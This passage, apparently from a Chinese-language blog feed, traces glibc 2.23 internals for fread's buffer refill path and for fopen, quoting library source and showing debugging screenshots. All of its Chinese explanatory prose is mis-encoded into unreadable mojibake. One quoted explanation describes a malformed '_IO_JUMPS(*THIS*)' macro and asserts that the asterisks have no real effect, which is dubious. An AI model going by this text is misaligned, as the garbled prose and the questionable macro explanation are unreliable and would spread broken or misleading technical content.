_IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure><p><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>æ£€æµ‹ç¼“å†²åŒºæ˜¯å¦æœ‰æ•°æ®ï¼Œæœ‰æ•°æ®å¯ä»¥ç›´æ¥è¿”å›è¯»å–</p><p>å¦åˆ™è°ƒç”¨_IO_UNDERFLOW</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)</span></span><br></pre></td></tr></table></figure><p><mark><strong>å³è™šè¡¨ä¸­çš„__underflowå­—æ®µï¼Œå¯¹åº”_IO_new_file_underflowå‡½æ•°</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<span class="comment">//ä¼šå…ˆæ£€æµ‹æ˜¯å¦å­˜åœ¨_IO_NO_READSæ ‡å¿—ï¼Œ</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<span class="comment">//æ£€æµ‹è¾“å…¥ç¼“å†²åŒºé‡Œå­˜åœ¨æ•°æ®</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_doallocbuf (fp);<span class="comment">//å¦‚æœæ²¡æœ‰è¾“å…¥ç¼“å†²åŒºï¼Œåˆ™å†æ¬¡è°ƒç”¨_IO_doallocbufåˆ†é…è¾“å…¥ç¼“å†²åŒº</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">     required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">     traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">     not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">     explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">      == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">    _IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"><span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">     handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">     unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå…ˆæ£€æµ‹æ˜¯å¦å­˜åœ¨_IO_NO_READSæ ‡å¿—ï¼Œè¾“å…¥ç¼“å†²åŒºé‡Œå­˜åœ¨æ•°æ®</p><p>å¦‚æœæ²¡æœ‰è¾“å…¥ç¼“å†²åŒºï¼Œåˆ™å†æ¬¡è°ƒç”¨_IO_doallocbufåˆ†é…è¾“å…¥ç¼“å†²åŒº</p><p>è®¾ç½®_IO_read_baseï¼Œ_IO_read_ptrï¼Œ_IO_read_endï¼Œ_IO_write_baseï¼Œ_IO_write_ptrï¼Œ_IO_write_endéƒ½ä¸ºfiledoalloc.cä¸­ç”³è¯·çš„å †çš„ç¼“å†²åŒº</p><img src="/2023/03/31/IO-FILE-fread/image-20230331225339043.png" alt="image-20230331225339043" style="zoom:67%;"><p>è°ƒç”¨**_IO_SYSREAD<strong>å‡½æ•°å°è¯•ä»</strong>fp<strong>ä¸­è¯»</strong>_IO_buf_end - _IO_buf_base**æ•°æ®åˆ°_IO_buf_base</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSREAD(FP, DATA, LEN) JUMP2 (__read, FP, DATA, LEN)</span></span><br></pre></td></tr></table></figure><p><mark><strong>_IO_SYSREAD è°ƒç”¨è™šè¡¨é‡Œçš„_&#x2F;readæŒ‡å‘çš„libio&#x2F;fileops.cçš„_IO_file_read</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_file_read (_IO_FILE *fp, <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">      ? read_not_cancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">      : read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_read)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/IO-FILE-fread/image-20230331230514508.png" alt="image-20230331230514508"></p><p>æŠŠæ–‡ä»¶æè¿°ç¬¦_filenoä»£è¡¨çš„æ–‡ä»¶æ•°æ®è¯»å…¥åˆ°_IO_buf_base</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331230607785.png" alt="image-20230331230607785"></p><p>ç§»åŠ¨_IO_read_endä½ç½®,æ¥æ ‡è®°è¯»å…¥æ•°æ®çš„ç»ˆç‚¹</p><img src="/2023/03/31/IO-FILE-fread/image-20230331231456814.png" alt="image-20230331231456814" style="zoom:67%;"><p>å†æ¬¡å›åˆ°_IO_file_xsgetnçš„whileå¾ªç¯</p><p>è¿™æ¬¡ä¼šè¿›å…¥ç¬¬ä¸€æ¡åˆ†æ”¯</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232055813.png" alt="image-20230331232055813"></p><p>é€šè¿‡memcpyæ‹·è´å†…å­˜åˆ°fopenå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°buffer</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232240158.png" alt="image-20230331232240158"></p><p>æ”¹å˜_IO_read_ptræŒ‡å‘åŒºåŸŸ</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232540181.png" alt="image-20230331232540181"></p><p>ä¸€ç›´å¾ªç¯åˆ°countä¸º0</p><h4 id="want-gt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-baseï¼‰æ—¶ï¼Œå³freadä¸€æ¬¡æƒ³è¦è¯»å–çš„æ•°æ®å¤§äº4k"><a href="#want-gt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-baseï¼‰æ—¶ï¼Œå³freadä¸€æ¬¡æƒ³è¦è¯»å–çš„æ•°æ®å¤§äº4k" class="headerlink" title="want &gt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_baseï¼‰æ—¶ï¼Œå³freadä¸€æ¬¡æƒ³è¦è¯»å–çš„æ•°æ®å¤§äº4k"></a>want &gt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_baseï¼‰æ—¶ï¼Œå³freadä¸€æ¬¡æƒ³è¦è¯»å–çš„æ•°æ®å¤§äº4k</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">count = want;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">    <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">        count -= want % block_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = _IO_SYSREAD (fp, s, count);</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s += count;</span><br><span class="line">want -= count;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setp(__fp, __p, __ep) \</span></span><br><span class="line"><span class="meta">       ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr \</span></span><br><span class="line"><span class="meta">    = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br></pre></td></tr></table></figure><p>macroå±•å¼€æ˜¯è¿™æ ·çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base));</span><br><span class="line">((fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base, (fp)-&gt;_IO_write_end = (fp-&gt;_IO_buf_base));</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯æŠŠç»“æ„ä½“é‡Œçš„<strong>read</strong>å’Œ<strong>write</strong>ç›¸å…³<strong>6</strong>ä¸ªæŒ‡é’ˆå‡åˆå§‹åŒ–ä¸º**_IO_buf_base**</p><p>å› ä¸ºæ­¤æ—¶ç”³è¯·çš„ç¼“å†²åŒºæœ€å¤§ï¼Œä¸€ä¸ªé¡µé¢4kï¼Œæ‰€ä»¥block_sizeä¸º4kï¼Œè°ƒç”¨_IO_SYSREADï¼Œè¿™ä¸€æ¬¡ä¸ç»è¿‡ç¼“å†²åŒºï¼Œç›´æ¥æŠŠæ•°æ®æ”¾å…¥æˆ‘ä»¬fopenæŒ‡å®šçš„ç¬¬ä¸€ä¸ªå‚æ•°é‡Œï¼Œs +&#x3D; count;<br>want -&#x3D; count;åï¼Œæœ€åå¦‚æœå¤§å°å°äº4kä¼šå’Œä¸Šé¢å°äº4kä¸€æ ·å…ˆè¿›å…¥ç¼“å†²åŒºå†è¯»å…¥ç¬¬ä¸€ä¸ªå‚æ•°å†…å­˜é‡Œ</p><h2 id="å‡½æ•°ä¸­è°ƒç”¨çš„vtableå‡½æ•°"><a href="#å‡½æ•°ä¸­è°ƒç”¨çš„vtableå‡½æ•°" class="headerlink" title="å‡½æ•°ä¸­è°ƒç”¨çš„vtableå‡½æ•°"></a>å‡½æ•°ä¸­è°ƒç”¨çš„vtableå‡½æ•°</h2><ul><li><code>_IO_sgetn</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_xsgetn</code>ã€‚</li><li><code>_IO_doallocbuf</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li><code>__underflow</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_underflow</code>å®ç°æ–‡ä»¶æ•°æ®è¯»å–ã€‚</li><li>vtableä¸­çš„<code>_IO_new_file_underflow</code>è°ƒç”¨äº†vtable<code>__GI__IO_file_read</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fopen</title>
      <link href="/2023/03/30/IO-FILE-fopen/"/>
      <url>/2023/03/30/IO-FILE-fopen/</url>
      
        <content type="html"><![CDATA[<h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>glibc2.23</p><p>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬Ubuntu glibcæºç  <a href="https://launchpad.net/ubuntu/+source/glibc/">https://launchpad.net/ubuntu/+source/glibc/</a></p><p>æˆ–è€…</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt-get install glibc-source</span><br><span class="line">sudo apt-get install libc6-dbg</span><br><span class="line">sudo apt-get install libc6-dbg:i386</span><br><span class="line">åˆ°/usr/src/glibc</span><br></pre></td></tr></table></figure><p>åœ¨.gdbinité‡Œå†™å…¥dir pathè¿›è¡Œæºç çº§è°ƒè¯•,ä¹Ÿå¯ä»¥ç›´æ¥åœ¨gdbé‡Œdir path</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span></span><br></pre></td></tr></table></figure><p><strong>&#x2F;include&#x2F;stdio.h</strong></p><p>æ‰¾åˆ°äº†fopençš„macro</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#   <span class="keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure><p><strong>&#x2F;libio&#x2F;iofopen.c</strong></p><p>_IO_new_fopenç›´æ¥è°ƒç”¨__fopen_internal</p><p><strong>_IO_new_fopen</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>__fopen_internal</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;          <span class="comment">//ä¸ºå¤šçº¿ç¨‹(Multithreading)ioå®‰å…¨å‡†å¤‡çš„é”</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>å…ˆç”¨mallocåˆ†é…äº†locked_FILEç±»å‹çš„ç»“æ„ä½“new_f</li><li><code>_IO_no_init</code>è¿›è¡Œåˆå§‹åŒ– _IO_FILE_plus fp</li><li><code>_IO_file_init</code>å°†ç»“æ„ä½“é“¾æ¥è¿›<code>_IO_list_all</code>é“¾è¡¨</li><li><code>_IO_file_fopen</code>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶</li></ol><h3 id="IO-no-initè¿›è¡Œåˆå§‹åŒ–-IO-FILE-plus-fp"><a href="#IO-no-initè¿›è¡Œåˆå§‹åŒ–-IO-FILE-plus-fp" class="headerlink" title="_IO_no_initè¿›è¡Œåˆå§‹åŒ– _IO_FILE_plus fp"></a><code>_IO_no_init</code>è¿›è¡Œåˆå§‹åŒ– _IO_FILE_plus fp</h3><p><strong>_IO_no_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (_IO_FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">         <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆè°ƒç”¨_IO_old_init è®¾ç½®flagsï¼Œå…¶ä½™NULLåˆå§‹åŒ–fp</p><p><strong>_IO_old_init</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (_IO_FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</code></p><p>å†æŠŠ<code>_wide_data</code>å­—æ®µèµ‹å€¼å¹¶åˆå§‹åŒ–fp-&gt;_wide_data-&gt;_wide_vtablä¸º_IO_wfile_jumps</p><p><img src="/2023/03/30/IO-FILE-fopen/image-20230330202938679.png" alt="image-20230330202938679"></p><h3 id="IO-file-initå°†ç»“æ„ä½“é“¾æ¥è¿›-IO-list-allé“¾è¡¨"><a href="#IO-file-initå°†ç»“æ„ä½“é“¾æ¥è¿›-IO-list-allé“¾è¡¨" class="headerlink" title="_IO_file_initå°†ç»“æ„ä½“é“¾æ¥è¿›_IO_list_allé“¾è¡¨"></a><code>_IO_file_init</code>å°†ç»“æ„ä½“é“¾æ¥è¿›<code>_IO_list_all</code>é“¾è¡¨</h3><p>å›åˆ°<code>__fopen_internal</code>å…ˆæ‰§è¡Œ<code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS(*THIS*) (THIS)-&gt;vtable</span></span><br></pre></td></tr></table></figure><blockquote><p><code>*THIS*</code> æ˜¯ä¸€ä¸ªæŒ‡é’ˆå‚æ•°ï¼Œå®ƒç”¨æ¥è¡¨ç¤ºä¼ å…¥å®å®šä¹‰çš„ç»“æ„ä½“æŒ‡é’ˆã€‚</p><p>åœ¨å®å®šä¹‰å±•å¼€æ—¶ï¼Œå‚æ•° <code>THIS</code> ä¼šè¢«æ›¿æ¢ä¸ºä¼ å…¥çš„ç»“æ„ä½“æŒ‡é’ˆã€‚è€Œ <code>*THIS*</code> ä¸­çš„æ˜Ÿå· <code>*</code> æ²¡æœ‰å®é™…çš„ä½œç”¨ï¼Œåªæ˜¯ä¸ºäº†æ ‡è¯† <code>THIS</code> æ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹çš„å‚æ•°ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£å®å®šä¹‰çš„ä½œç”¨ï¼Œæ˜ç¡®å‚æ•°ç±»å‹ï¼Œå¢åŠ ä»£ç 